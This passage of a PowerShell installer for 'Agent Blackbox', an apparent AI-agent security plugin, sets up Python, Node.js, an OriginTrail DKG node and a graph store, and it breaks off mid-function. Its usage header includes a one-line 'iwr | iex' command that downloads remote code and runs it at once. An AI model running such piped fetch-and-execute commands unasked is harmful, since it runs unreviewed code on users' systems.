# ============================================================================
# Agent Blackbox - one-command installer (Windows / PowerShell)
# ============================================================================
# Mirror of blackbox-install.sh. Wires up the Blackbox threat-graph plugin,
# installs the OriginTrail DKG node CLI (Windows-native), bootstraps a mainnet
# node, enables the plugin, and writes config defaults.
#
# NOTE: The Hermes agent itself is best run under WSL2 on Windows. The DKG CLI
# (dkg) is Windows-native. This installer sets up the Python environment and
# DKG node; if you hit issues running `hermes`, use WSL2 (guidance printed at
# the end).
#
# Usage:
#   iwr -useb blackbox-w.umanitek.ai | iex
#   # or, from a clone:
#   .\scripts\blackbox-install.ps1 [-SkipDkg]
#
# Idempotent: safe to re-run. If the DKG node or initial threat-graph sync
# cannot complete, the installer exits non-zero and prints clear next steps
# instead of claiming Blackbox is fully ready with an empty ruleset.
# ============================================================================

param(
    [switch]$SkipDkg,
    [ValidateSet("auto", "blazegraph", "oxigraph")]
    [string]$StoreBackend = "auto",
    [switch]$Help
)

# Mainnet only.
$Network = if ($env:BLACKBOX_DKG_NETWORK) { $env:BLACKBOX_DKG_NETWORK } else { "mainnet-base" }

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# ── Configuration (override via env) ────────────────────────────────────────
$RepoUrl     = if ($env:BLACKBOX_REPO_URL)    { $env:BLACKBOX_REPO_URL }    else { "https://github.com/umanitek/agent-blackbox.git" }
$RepoBranch  = if ($env:BLACKBOX_REPO_BRANCH) { $env:BLACKBOX_REPO_BRANCH } else { "main" }
$HermesHome  = if ($env:HERMES_HOME)          { $env:HERMES_HOME }          else { "$env:USERPROFILE\.hermes" }
# Keep the managed npm DKG package and state in the Agent Blackbox checkout. When
# invoked from a clone, use that clone; when piped through iex, default to an
# agent-blackbox child of the invocation directory. BLACKBOX_INSTALL_DIR remains
# the explicit override.
if ($env:BLACKBOX_INSTALL_DIR) {
    $DefaultRepoDir = $env:BLACKBOX_INSTALL_DIR
} elseif (
    (Test-Path "$(Get-Location)\pyproject.toml") -and
    (Test-Path "$(Get-Location)\plugins\blackbox")
) {
    $DefaultRepoDir = [string](Get-Location)
} else {
    $DefaultRepoDir = Join-Path ([string](Get-Location)) "agent-blackbox"
}
if ($PSCommandPath) {
    $candidateRepoDir = Split-Path -Parent (Split-Path -Parent $PSCommandPath)
    if ((Test-Path "$candidateRepoDir\pyproject.toml") -and (Test-Path "$candidateRepoDir\plugins\blackbox")) {
        $DefaultRepoDir = $candidateRepoDir
    }
}
$BlackboxHome = if ($env:BLACKBOX_HOME)       { $env:BLACKBOX_HOME }        else { Join-Path $HermesHome "blackbox" }
$DkgPortExplicit = [bool]$env:BLACKBOX_DKG_PORT
$DkgStoreUrlExplicit = [bool]$env:BLACKBOX_DKG_STORE_URL
$DkgPort     = if ($env:BLACKBOX_DKG_PORT)    { [int]$env:BLACKBOX_DKG_PORT } else { 9320 }
$DkgStorePort = if ($env:BLACKBOX_DKG_STORE_PORT) { [int]$env:BLACKBOX_DKG_STORE_PORT } else { 9999 }
$DkgStoreUrl = if ($env:BLACKBOX_DKG_STORE_URL) { $env:BLACKBOX_DKG_STORE_URL } else { "" }
$DkgStoreManagedByDkg = $false
$script:DkgStoreNamespace = "agent-blackbox"
$script:DkgSelectedStoreBackend = ""
$script:DockerRequired = $false
$DkgAcceptStoreReset = $false
$DkgHome     = Join-Path $DefaultRepoDir ".dkg"
$DkgCliDir   = Join-Path $DefaultRepoDir "dkg"
$DkgBin      = Join-Path $DkgCliDir "node_modules\.bin\dkg.cmd"
$DkgPackage  = if ($env:BLACKBOX_DKG_PACKAGE) { $env:BLACKBOX_DKG_PACKAGE } else { "@origintrail-official/dkg@latest" }
$DkgDaemonUrl = "http://127.0.0.1:$DkgPort"
$DkgStoreQueueLimit = if ($env:BLACKBOX_DKG_STORE_QUEUE_LIMIT) { [int]$env:BLACKBOX_DKG_STORE_QUEUE_LIMIT } else { 512 }
$DkgListContextGraphsProjection = if ($env:BLACKBOX_DKG_LIST_CONTEXT_GRAPHS_PROJECTION) { $env:BLACKBOX_DKG_LIST_CONTEXT_GRAPHS_PROJECTION } else { "1" }
$DkgSyncGlobalMaxInflight = "1"
$DkgSyncGlobalQueueLimit = "0"
$script:DkgDurableSyncEnabled = if ($env:BLACKBOX_DKG_DURABLE_SYNC_ENABLED) { $env:BLACKBOX_DKG_DURABLE_SYNC_ENABLED } else { "1" }
$DkgCatchupMaxConcurrentPeers = "1"
$DkgStoreQueueWaitTimeoutMs = "300000"
$script:DkgNodeOptions = ""
$NodeMajor   = if ($env:BLACKBOX_NODE_MAJOR)  { [int]$env:BLACKBOX_NODE_MAJOR } else { 22 }
$ContextGraphId = if ($env:BLACKBOX_CONTEXT_GRAPH_ID) { $env:BLACKBOX_CONTEXT_GRAPH_ID } else { "0x37b1Fdfd134e2b17583bCBdD3034F91504cD9C70/agent-blackbox-vm" }
$GraphPeerId = if ($env:BLACKBOX_GRAPH_PEER_ID) { $env:BLACKBOX_GRAPH_PEER_ID } else { "12D3KooWBJskzr2unXQG9mR3LRZFUJoxWr1PN6hTbyWyKndHXjZM" }
$CatchupTimeout = if ($env:BLACKBOX_DKG_CATCHUP_TIMEOUT) { [int]$env:BLACKBOX_DKG_CATCHUP_TIMEOUT } else { 3600 }
$script:InstallIncomplete = $false
$script:DkgAlreadyRunning = $false
$script:DkgFreshState = $false
$script:DkgForeignEndpoint = $false
$script:DkgRestartRequired = $false
$script:DkgRuntimeMarker = Join-Path $DkgHome ".blackbox-runtime.sha256"
$script:DkgNodePathMarker = Join-Path $DkgHome ".blackbox-node-path"
$script:DkgStoreResetMarker = Join-Path $DkgHome ".blackbox-store-reset-pending"
$script:DkgRuntimeFingerprint = ""

# ── Echo helpers (DRY) ──────────────────────────────────────────────────────
function Write-Step    { param($m) Write-Host "-> $m" -ForegroundColor Cyan }
function Write-Ok      { param($m) Write-Host "[OK] $m" -ForegroundColor Green }
function Write-Warn2   { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err2    { param($m) Write-Host "[X] $m" -ForegroundColor Red }
function Write-Heading { param($m) Write-Host ""; Write-Host $m -ForegroundColor Green }

function Write-Banner {
    Write-Host ""
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host "  |        [S] Agent Blackbox - installer            |" -ForegroundColor Green
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host "  |  A threat-graph immune system for your AI agent.          |" -ForegroundColor Green
    Write-Host "  |  Detect prompt injection, tool escalation & bad deps -    |" -ForegroundColor Green
    Write-Host "  |  shared across agents via the OriginTrail DKG.            |" -ForegroundColor Green
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host ""
}

function Show-Usage {
    @"
Agent Blackbox installer (Windows)

Usage: blackbox-install.ps1 [-SkipDkg] [-StoreBackend auto|blazegraph|oxigraph] [-Help]

Options:
  -SkipDkg          Skip DKG setup; plugin installs but first-run protection is incomplete
  -StoreBackend     Store backend (default: auto; Blazegraph preferred, Oxigraph fallback asks first)
  -Help             Show this help and exit

The DKG node bootstraps on mainnet. The default context graph is public, and
subscribing and reading need no funds.

Environment overrides:
	  BLACKBOX_REPO_URL, BLACKBOX_REPO_BRANCH, HERMES_HOME, BLACKBOX_NODE_MAJOR,
	  BLACKBOX_CONTEXT_GRAPH_ID, BLACKBOX_GRAPH_PEER_ID,
	  BLACKBOX_DKG_PORT, BLACKBOX_DKG_STORE_PORT,
	  BLACKBOX_DKG_STORE_URL, BLACKBOX_DKG_HOME,
	  BLACKBOX_DKG_CLI_DIR, BLACKBOX_DKG_BIN, BLACKBOX_DKG_PACKAGE,
	  BLACKBOX_DKG_DAEMON_URL,
	  BLACKBOX_DKG_STORE_QUEUE_LIMIT, BLACKBOX_DKG_LIST_CONTEXT_GRAPHS_PROJECTION,
	  BLACKBOX_DKG_CATCHUP_TIMEOUT

Blackbox uses its own DKG home and port by default:
  DKG home: $DkgHome
  DKG CLI:  $DkgBin
  DKG URL:  $DkgDaemonUrl
  Store:    auto (Blazegraph preferred; Oxigraph requires confirmation)

Note: Run the Hermes agent under WSL2 on Windows for best results.
This installer is idempotent. If DKG setup or the first ruleset sync cannot
complete, it exits non-zero and prints the command to retry.
"@ | Write-Host
}

if ($Help) { Show-Usage; exit 0 }
if ($StoreBackend -eq "oxigraph" -and $DkgStoreUrlExplicit) {
    Write-Err2 "BLACKBOX_DKG_STORE_URL cannot be combined with -StoreBackend oxigraph."
    exit 1
}

# ── Prerequisite checks ─────────────────────────────────────────────────────
function Test-Git {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Ok "git $((git --version) -replace 'git version ','')"
    } else {
        Write-Err2 "git not found."
        Write-Step "Install: winget install Git.Git   (or https://git-scm.com/download/win)"
        exit 1
    }
}

function Resolve-Python {
    # Accept 3.11-3.13. Try py launcher pins, then python.
    $candidates = @("py -3.13", "py -3.12", "py -3.11", "python")
    foreach ($c in $candidates) {
        $parts = $c.Split(" ")
        $exe = $parts[0]
        if (-not (Get-Command $exe -ErrorAction SilentlyContinue)) { continue }
        try {
            $args = @()
            if ($parts.Count -gt 1) { $args += $parts[1] }
            $args += @("-c", "import sys; raise SystemExit(0 if (3,11)<=sys.version_info[:2]<=(3,13) else 1)")
            & $exe @args 2>$null
            if ($LASTEXITCODE -eq 0) {
                $script:PyExe = $exe
                $script:PyArgs = if ($parts.Count -gt 1) { @($parts[1]) } else { @() }
                $ver = (& $exe @($script:PyArgs + @("-V")) 2>&1)
                Write-Ok "Python $ver ($c)"
                return
            }
        } catch { }
    }
    Write-Err2 "Python 3.11-3.13 not found."
    Write-Step "Install: winget install Python.Python.3.11   (or https://python.org/downloads)"
    exit 1
}

function Test-NodeOk {
    if (-not (Get-Command node -ErrorAction SilentlyContinue)) { return $false }
    $maj = [int]((node -v) -replace '^v','' -replace '\..*$','')
    return ($maj -ge $NodeMajor)
}

function Test-NodeJs {
    if (Test-NodeOk) {
        Write-Ok "Node.js $(node -v) + npm $(npm -v 2>$null)"
        $script:HasNode = $true
        return
    }
    if ($SkipDkg) { $script:HasNode = $false; return }
    Write-Warn2 "Node.js $NodeMajor+ not found - installing it automatically (winget) ..."
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        try {
            winget install --id OpenJS.NodeJS.LTS --silent --accept-source-agreements --accept-package-agreements | Out-Null
            # Refresh PATH so node/npm resolve in this session.
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' +
                        [System.Environment]::GetEnvironmentVariable('Path','User')
        } catch { Write-Warn2 "winget Node install did not complete." }
    } else {
        Write-Warn2 "winget not available for automatic Node install."
    }
    if (Test-NodeOk) {
        Write-Ok "Node.js $(node -v) installed"
        $script:HasNode = $true
    } else {
        $script:HasNode = $false
        Write-Step "Install Node ${NodeMajor} manually: winget install OpenJS.NodeJS.LTS (then re-run this installer)."
        Write-Step "The Blackbox plugin still works; the DKG node is added once Node is present."
    }
}

function Initialize-BlackboxDkgProcessEnvironment {
    $helper = Join-Path $RepoDir "scripts\blackbox-dkg-runtime-fingerprint.py"
    if (-not (Test-Path $helper)) {
        Write-Warn2 "DKG runtime settings helper is missing: $helper"
        return $false
    }
    $heapOutput = @(& $script:VenvPython $helper heap 8192 2>&1)
    $heapMb = "$($heapOutput | Select-Object -Last 1)".Trim()
    if ($LASTEXITCODE -ne 0 -or $heapMb -notmatch '^[1-9][0-9]*$') {
        if ($heapOutput) { $heapOutput | ForEach-Object { Write-Warn2 "$_" } }
        Write-Warn2 "Could not resolve a safe Node.js heap limit for the DKG daemon."
        return $false
    }
    $existingOptions = if ($env:NODE_OPTIONS) { $env:NODE_OPTIONS.Trim() } else { "" }
    $nodeOptionsOutput = @(& $script:VenvPython $helper node-options $heapMb $existingOptions 2>&1)
    if ($LASTEXITCODE -ne 0) {
        if ($nodeOptionsOutput) { $nodeOptionsOutput | ForEach-Object { Write-Warn2 "$_" } }
        Write-Warn2 "Could not prepare Node.js options for the DKG daemon."
        return $false
    }
    $script:DkgNodeOptions = "$($nodeOptionsOutput | Select-Object -Last 1)".Trim()
    Write-Ok "DKG safety limits: one large sync at a time; V8 heap ${heapMb}MB"
    return $true
}

function Invoke-BlackboxDkg {
    param([Parameter(ValueFromRemainingArguments = $true)][string[]]$Args)
    # These process-level guards wrap the DKG entrypoint, so they apply equally
    # to external Blazegraph and the daemon-managed Oxigraph server.
    $names = @(
        "DKG_HOME",
        "DKG_ACCEPT_STORE_RESET",
        "DKG_STORE_QUEUE_LIMIT",
        "DKG_LIST_CONTEXT_GRAPHS_PROJECTION",
        "DKG_SYNC_ON_CONNECT_ENABLED",
        "DKG_SYNC_RECONCILER_ENABLED",
        "DKG_DURABLE_SYNC_ENABLED",
        "DKG_SYNC_GLOBAL_MAX_INFLIGHT",
        "DKG_SYNC_GLOBAL_QUEUE_LIMIT",
        "DKG_CATCHUP_MAX_CONCURRENT_PEERS",
        "DKG_STORE_QUEUE_WAIT_TIMEOUT_MS",
        "DKG_SYNC_TOTAL_TIMEOUT_MS",
        "DKG_SWM_RECOVERY_TIMEOUT_MS",
        "NODE_OPTIONS",
        "Path"
    )
    $previous = @{}
    foreach ($name in $names) {
        $previous[$name] = [System.Environment]::GetEnvironmentVariable($name, "Process")
    }
    try {
        $nodeCommand = Get-Command node -ErrorAction SilentlyContinue
        if ($nodeCommand -and $nodeCommand.Source) {
            $env:Path = "$(Split-Path -Parent $nodeCommand.Source);$env:Path"
        }
        $env:DKG_HOME = $DkgHome
        $env:DKG_ACCEPT_STORE_RESET = if (
            $script:DkgAcceptStoreReset -or (Test-Path $script:DkgStoreResetMarker)
        ) { "1" } else { "0" }
        $env:DKG_STORE_QUEUE_LIMIT = "$DkgStoreQueueLimit"
        $env:DKG_LIST_CONTEXT_GRAPHS_PROJECTION = "$DkgListContextGraphsProjection"
        $env:DKG_SYNC_ON_CONNECT_ENABLED = "1"
        $env:DKG_SYNC_RECONCILER_ENABLED = "1"
        $env:DKG_DURABLE_SYNC_ENABLED = $script:DkgDurableSyncEnabled
        $env:DKG_SYNC_GLOBAL_MAX_INFLIGHT = "$DkgSyncGlobalMaxInflight"
        $env:DKG_SYNC_GLOBAL_QUEUE_LIMIT = "$DkgSyncGlobalQueueLimit"
        $env:DKG_CATCHUP_MAX_CONCURRENT_PEERS = "$DkgCatchupMaxConcurrentPeers"
        $env:DKG_STORE_QUEUE_WAIT_TIMEOUT_MS = "$DkgStoreQueueWaitTimeoutMs"
        $env:DKG_SYNC_TOTAL_TIMEOUT_MS = "1800000"
        $env:DKG_SWM_RECOVERY_TIMEOUT_MS = "3600000"
        $env:NODE_OPTIONS = $script:DkgNodeOptions
        & $DkgBin @Args
    } finally {
        foreach ($name in $names) {
            if ($null -eq $previous[$name]) {
                Remove-Item "Env:$name" -ErrorAction SilentlyContinue
            } else {
                Set-Item "Env:$name" $previous[$name]
            }
        }
    }
}

function Test-BlackboxDkgState {
    return ((Test-Path (Join-Path $DkgHome "auth.token")) -or (Test-Path (Join-Path $DkgHome "config.json")))
}

function Prepare-BlackboxDkgRuntimeFingerprint {
    $fingerprinter = Join-Path $RepoDir "scripts\blackbox-dkg-runtime-fingerprint.py"
    if (-not (Test-Path $fingerprinter)) {
        $script:InstallIncomplete = $true
        Write-Warn2 "DKG runtime fingerprint helper is missing; loaded npm runtime cannot be verified."
        return $false
    }
    $nodeCommand = Get-Command node -ErrorAction SilentlyContinue
    if (-not $nodeCommand -or -not $nodeCommand.Source) {
        $script:InstallIncomplete = $true
        Write-Warn2 "Could not resolve the Node.js runtime for DKG fingerprinting."
        return $false
    }
    $fingerprintOutput = @(& $script:VenvPython $fingerprinter compute $DkgCliDir $DkgHome $nodeCommand.Source $DkgBin $DkgStoreQueueLimit $DkgListContextGraphsProjection $DkgSyncGlobalMaxInflight $script:DkgNodeOptions $DkgCatchupMaxConcurrentPeers $DkgStoreQueueWaitTimeoutMs 2>&1)
    if ($LASTEXITCODE -ne 0) {
        $script:InstallIncomplete = $true
        if ($fingerprintOutput) {
            $fingerprintOutput | ForEach-Object { Write-Warn2 "$_" }
        }
        Write-Warn2 "Could not fingerprint the configured DKG runtime; setup is incomplete."
        return $false
    }
    $script:DkgRuntimeFingerprint = "$($fingerprintOutput | Select-Object -Last 1)".Trim()
    $applied = if (Test-Path $script:DkgRuntimeMarker) {
        (Get-Content -Raw $script:DkgRuntimeMarker).Trim()
    } else {
        ""
    }
    if ($applied -ne $script:DkgRuntimeFingerprint) {
        $script:DkgRestartRequired = $true
    }
    return $true
}

function Save-BlackboxDkgRuntimeFingerprint {
    $fingerprinter = Join-Path $RepoDir "scripts\blackbox-dkg-runtime-fingerprint.py"
    if (-not $script:DkgRuntimeFingerprint) {
        $script:InstallIncomplete = $true
        Write-Warn2 "DKG runtime fingerprint is empty after restart."
        return $false
    }
    & $script:VenvPython $fingerprinter record $script:DkgRuntimeMarker $script:DkgRuntimeFingerprint
    if ($LASTEXITCODE -ne 0) {
        $script:InstallIncomplete = $true
        Write-Warn2 "DKG restarted, but its applied runtime fingerprint could not be recorded."
        return $false
    }
    $nodeCommand = Get-Command node -ErrorAction SilentlyContinue
    if ($nodeCommand -and $nodeCommand.Source) {
        Set-Content -LiteralPath $script:DkgNodePathMarker -Value $nodeCommand.Source
    }
    return $true
}

function Wait-BlackboxDkgRuntime {
    $verifier = Join-Path $RepoDir "scripts\blackbox-dkg-runtime-fingerprint.py"
    $expectedCommit = (& $script:VenvPython $verifier commit $DkgCliDir).Trim()
    if ($LASTEXITCODE -ne 0 -or -not $expectedCommit) {
        $script:InstallIncomplete = $true
        Write-Warn2 "Could not resolve the published DKG build commit."
        return $false
    }
    $null = & $script:VenvPython $verifier wait $DkgDaemonUrl $expectedCommit 90
    if ($LASTEXITCODE -ne 0) {
        $script:InstallIncomplete = $true
        Write-Warn2 "The DKG daemon did not activate npm build $($expectedCommit.Substring(0, 12))."
        return $false
    }
    Write-Ok "DKG daemon is ready on npm build $($expectedCommit.Substring(0, 12))"
    return $true
}

function Move-LegacyBlackboxDkgHome {
    $legacyHome = Join-Path $HOME ".hermes\blackbox\dkg"
    $legacyBin = Join-Path $HOME ".hermes\blackbox\dkg-cli\node_modules\.bin\dkg.cmd"
    if ([System.IO.Path]::GetFullPath($legacyHome) -eq [System.IO.Path]::GetFullPath($DkgHome)) { return $true }
    if (-not (Test-Path (Join-Path $legacyHome "config.json"))) { return $true }

    $pidPath = Join-Path $legacyHome "daemon.pid"
    $legacyPid = if (Test-Path $pidPath) { (Get-Content -Raw $pidPath).Trim() } else { "" }
    $legacyProcess = if ($legacyPid -match '^\d+$') {
        Get-Process -Id ([int]$legacyPid) -ErrorAction SilentlyContinue
    } else { $null }
    if ($legacyProcess) {
        if (-not (Test-Path $legacyBin)) {
            $script:InstallIncomplete = $true
            Write-Warn2 "The deprecated Blackbox DKG is running, but its stop command is missing: $legacyBin"
            return $false
        }
        Write-Step "Stopping the deprecated Blackbox DKG at $legacyHome ..."
        $previousHome = $env:DKG_HOME
        try {
            $env:DKG_HOME = $legacyHome
            & $legacyBin stop
            if ($LASTEXITCODE -ne 0) { throw "legacy dkg stop exit $LASTEXITCODE" }
            if (Get-Process -Id ([int]$legacyPid) -ErrorAction SilentlyContinue) {
                throw "legacy DKG process is still running"
            }
        } catch {
            $script:InstallIncomplete = $true
            Write-Warn2 "Could not stop the deprecated Blackbox DKG safely."
            return $false
        } finally {
            if ($null -eq $previousHome) { Remove-Item Env:DKG_HOME -ErrorAction SilentlyContinue }
            else { $env:DKG_HOME = $previousHome }
        }
    }

    if (-not (Test-Path $DkgHome)) {
        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $DkgHome) | Out-Null
        Move-Item $legacyHome $DkgHome
        Write-Ok "Migrated the Blackbox DKG identity and graph state into this checkout"
    } else {
        Write-Warn2 "Deprecated DKG state remains at $legacyHome (stopped); current state is $DkgHome."
    }
    return $true
}

function Set-BlackboxDkgPort {
    param([int]$Port)
    $script:DkgPort = $Port
    $script:DkgDaemonUrl = "http://127.0.0.1:$Port"
}

function Test-PortInUse {
    param([int]$Port)
    $client = [System.Net.Sockets.TcpClient]::new()
    try {
        $async = $client.BeginConnect("127.0.0.1", $Port, $null, $null)
        if ($async.AsyncWaitHandle.WaitOne(500)) {
            $client.EndConnect($async)
            return $true
        }
        return $false
    } catch {
        return $false
    } finally {
        $client.Close()
    }
}

function Select-BlackboxDkgPort {
    for ($candidate = $DkgPort; $candidate -le 9399; $candidate++) {
        if (-not (Test-PortInUse $candidate)) {
            Set-BlackboxDkgPort $candidate
            Write-Ok "Using Blackbox DKG port $DkgPort"
            return $true
        }
    }
    return $false
}

function Test-BlackboxDkgPort {
    try {
        Invoke-WebRequest -Uri "$DkgDaemonUrl/api/status" -UseBasicParsing -TimeoutSec 3 | Out-Null
        if (Test-BlackboxDkgState) {
            Write-Ok "Blackbox DKG endpoint already responds at $DkgDaemonUrl"
            $script:DkgAlreadyRunning = $true
            return $true
        }
        Write-Warn2 "Port $DkgPort already has a DKG endpoint, but $DkgHome has no Blackbox node state."
        $script:DkgForeignEndpoint = $true
        if ($DkgPortExplicit) {
            $script:InstallIncomplete = $true
            Write-Step "Set BLACKBOX_DKG_PORT to a free port or stop the process on $DkgDaemonUrl."
            return $false
        }
        Write-Step "Choosing a different Blackbox-owned port so the existing DKG node is untouched."
        if (Select-BlackboxDkgPort) { return $true }
        $script:InstallIncomplete = $true
        Write-Warn2 "Could not find a free Blackbox DKG port in 9320-9399."
        return $false
    } catch { }

    if (Test-PortInUse $DkgPort) {
        Write-Warn2 "Port $DkgPort is already in use, but it did not answer as a DKG node at $DkgDaemonUrl."
        if ($DkgPortExplicit) {
            $script:InstallIncomplete = $true
            Write-Step "Set BLACKBOX_DKG_PORT to a free port and re-run the installer."
            return $false
        }
        Write-Step "Choosing a different Blackbox-owned port."
        if (Select-BlackboxDkgPort) { return $true }
        $script:InstallIncomplete = $true
        Write-Warn2 "Could not find a free Blackbox DKG port in 9320-9399."
        return $false
    }
    return $true
}

function Test-BlackboxBlazegraph {
    $helper = Join-Path $RepoDir "scripts\blackbox-blazegraph.mjs"
    Write-Step "Checking the Blazegraph SPARQL endpoint ..."
    try {
        $output = @(& node $helper check $DkgCliDir $DkgStoreUrl 2>&1)
        $code = $LASTEXITCODE
    } catch {
        $output = @($_)
        $code = 1
    }
    if ($code -ne 0) {
        $output | ForEach-Object { Write-Err2 ([string]$_) }
        Write-Err2 "Blazegraph is unavailable or returned an error at $DkgStoreUrl."
        return $false
    }
    Write-Ok "Blazegraph SPARQL endpoint is healthy at $DkgStoreUrl"
    return $true
}

function Show-DockerSetupHint {
    Write-Heading "Docker is required for the Blazegraph store"
    Write-Err2 "Docker Desktop is not installed or its engine is not running."
    Write-Step "Install Docker Desktop, start it, wait until it reports Ready, then re-run Blackbox:"
    Write-Host ""
    Write-Host "    winget install -e --id Docker.DockerDesktop --accept-source-agreements --accept-package-agreements" -ForegroundColor Yellow
    Write-Host '    Start-Process "$Env:ProgramFiles\Docker\Docker\Docker Desktop.exe"' -ForegroundColor Yellow
    Write-Host ""
    Write-Step "Docker's official guide: https://docs.docker.com/desktop/setup/install/windows-install/"
    Write-Step "Verify Docker before retrying: docker info"
}

function Test-DockerForBlazegraph {
    if (-not (Get-Command docker -ErrorAction SilentlyContinue)) {
        $script:DockerRequired = $true
        Show-DockerSetupHint
        return $false
    }
    try {
        & docker info *> $null
        if ($LASTEXITCODE -ne 0) { throw "docker info exit $LASTEXITCODE" }
    } catch {
        $script:DockerRequired = $true
        Show-DockerSetupHint
        return $false
    }
    Write-Ok "Docker engine is ready for Blazegraph"
    return $true
}

function Use-BlackboxOxigraph {
    $script:DockerRequired = $false
    $script:DkgSelectedStoreBackend = "oxigraph-server"
    $script:DkgStoreUrl = ""
    $script:DkgStoreManagedByDkg = $false
    Write-Warn2 "Using the DKG-managed Oxigraph store (no Docker container required)."
}

function Confirm-OxigraphFallback {
    param([string]$Reason)
    Write-Warn2 $Reason
    Write-Step "Recommended default: stop here, install/start or repair Docker, then re-run Blackbox with Blazegraph."
    Write-Step "Alternative: type y to continue now with the DKG-managed Oxigraph store."
    try {
        $answer = Read-Host "Continue with Oxigraph instead? [y/N]"
    } catch {
        Write-Warn2 "No interactive terminal is available, so Oxigraph was not selected."
        Write-Step "To choose it explicitly, re-run with: -StoreBackend oxigraph"
        return $false
    }
    if ($answer -match '^(y|yes)$') { return $true }
    Write-Step "Keeping Blazegraph as the default. Set up Docker and re-run the installer."
    return $false
}

function Get-BlackboxStoreDescription {
    if ($script:DkgSelectedStoreBackend -eq "oxigraph-server") {
        return "Oxigraph (DKG-managed local server)"
    }
    if ($script:DkgSelectedStoreBackend -eq "blazegraph") {
        return "Blazegraph at $DkgStoreUrl"
    }
    if ($DkgStoreUrl) { return $DkgStoreUrl }
    return "not configured"
}

function Initialize-BlackboxStore {
    $helper = Join-Path $RepoDir "scripts\blackbox-blazegraph.mjs"
    $namespace = "agent-blackbox"
    $existingBackend = ""
    $existingUrl = ""
    $existingManaged = $false
    $configPath = Join-Path $DkgHome "config.json"
    if (Test-Path $configPath) {
        try {
            $existing = Get-Content -Raw $configPath | ConvertFrom-Json
            if ($existing.name) { $namespace = [string]$existing.name }
            if ($existing.store.backend) { $existingBackend = [string]$existing.store.backend }
            if ($existing.store.options.url) { $existingUrl = [string]$existing.store.options.url }
            $existingManaged = $existing.store.options.managedByDkg -eq $true
        } catch { }
    }
    $script:DkgStoreNamespace = $namespace

    if ($StoreBackend -eq "oxigraph") {
        Use-BlackboxOxigraph
        return $true
    }
    if ($DkgStoreUrlExplicit) {
        $script:DkgSelectedStoreBackend = "blazegraph"
        $script:DkgStoreManagedByDkg = $false
        Write-Step "Using operator-managed Blazegraph at $DkgStoreUrl"
        return (Test-BlackboxBlazegraph)
    }
    if ($StoreBackend -eq "auto" -and $existingBackend -eq "oxigraph-server") {
        Write-Step "Preserving the existing DKG-managed Oxigraph store."
        Use-BlackboxOxigraph
        return $true
    }
    if ($existingBackend -eq "blazegraph" -and -not $existingManaged -and $existingUrl) {
        $script:DkgSelectedStoreBackend = "blazegraph"
        $script:DkgStoreUrl = $existingUrl
        $script:DkgStoreManagedByDkg = $false
        Write-Step "Reusing operator-managed Blazegraph at $DkgStoreUrl"
        return (Test-BlackboxBlazegraph)
    }
    if ($existingBackend -eq "blazegraph" -and $existingManaged -and $existingUrl) {
        $script:DkgSelectedStoreBackend = "blazegraph"
        $script:DkgStoreUrl = $existingUrl
        $script:DkgStoreManagedByDkg = $true
        if (Test-BlackboxBlazegraph) { return $true }
        if ($script:DkgAlreadyRunning) {
            Write-Step "Pausing DKG so its overloaded store can pass recovery checks ..."
            Invoke-BlackboxDkg stop
            if ($LASTEXITCODE -eq 0) {
                $script:DkgAlreadyRunning = $false
                if (Test-BlackboxBlazegraph) { return $true }
                $managedContainer = "dkg-blazegraph-$namespace"
                $storeRestarted = $false
                Write-Step "Restarting the unresponsive managed Blazegraph container ..."
                & docker restart $managedContainer | Out-Null
                if ($LASTEXITCODE -eq 0) {
                    $storeRestarted = $true
                } else {
                    # A wedged JVM can leave the container stopped even though
                    # Docker reports a failed graceful restart. Start the same
                    # container so its graph volume remains intact.
                    $running = (& docker inspect -f '{{.State.Running}}' $managedContainer 2>$null)
                    if ($LASTEXITCODE -eq 0 -and "$running".Trim() -eq "false") {
                        & docker start $managedContainer | Out-Null
                        if ($LASTEXITCODE -eq 0) { $storeRestarted = $true }
                    }
                    if (-not $storeRestarted) {
                        Write-Warn2 "Could not restart managed container $managedContainer."
                    }
                }
                if ($storeRestarted -and (Test-BlackboxBlazegraph)) {
                    return $true
                }
            } else {
                Write-Warn2 "Could not pause the Blackbox DKG daemon before store recovery."
            }
        }
        Write-Warn2 "The managed Blazegraph endpoint is down; attempting Docker recovery."
    }
    if (-not (Test-DockerForBlazegraph)) {
        if ($StoreBackend -eq "auto" -and
            (Confirm-OxigraphFallback "Blazegraph cannot be installed because Docker is unavailable.")) {
            Use-BlackboxOxigraph
            return $true
        }
        return $false
    }
    if (-not (Test-Path $helper)) {
        Write-Warn2 "Blazegraph provisioner helper is missing: $helper"
        if ($StoreBackend -eq "auto" -and
            (Confirm-OxigraphFallback "Blazegraph provisioning cannot continue without its helper.")) {
            Use-BlackboxOxigraph
            return $true
        }
        return $false
    }

    Write-Step "Provisioning Blazegraph through the DKG Docker provisioner ..."
    try {
        $output = @(& node $helper $DkgCliDir $namespace $DkgStorePort)
        if ($LASTEXITCODE -ne 0) { throw "Blazegraph helper exit $LASTEXITCODE" }
        $result = ($output | Select-Object -Last 1) | ConvertFrom-Json
        $script:DkgStoreUrl = [string]$result.url
        $script:DkgStorePort = [int]$result.port
        $script:DkgSelectedStoreBackend = "blazegraph"
        $script:DkgStoreManagedByDkg = $true
        if (Test-BlackboxBlazegraph) { return $true }
        if ($StoreBackend -eq "auto" -and
            (Confirm-OxigraphFallback "Blazegraph did not pass its SPARQL health check.")) {
            Use-BlackboxOxigraph
            return $true
        }
        return $false
    } catch {
        if ($StoreBackend -eq "auto" -and
            (Confirm-OxigraphFallback "Blazegraph provisioning failed even though Docker is available.")) {
            Use-BlackboxOxigraph
            return $true
        }
        Write-Warn2 "Could not provision Blazegraph."
        return $false
    }
}

function Reset-FreshManagedBlazegraph {
    if (-not $script:DkgFreshState) { return $true }
    if ($script:DkgSelectedStoreBackend -ne "blazegraph") { return $true }
    if (-not $script:DkgStoreManagedByDkg) { return $true }
    if ($DkgStoreUrlExplicit) { return $true }
    if ($script:DkgForeignEndpoint) {
        Write-Err2 "Refusing to reset the Blackbox namespace while an unrelated DKG endpoint is running."
        Write-Step "Stop that DKG node or set BLACKBOX_DKG_STORE_URL to an operator-managed store."
        return $false
    }
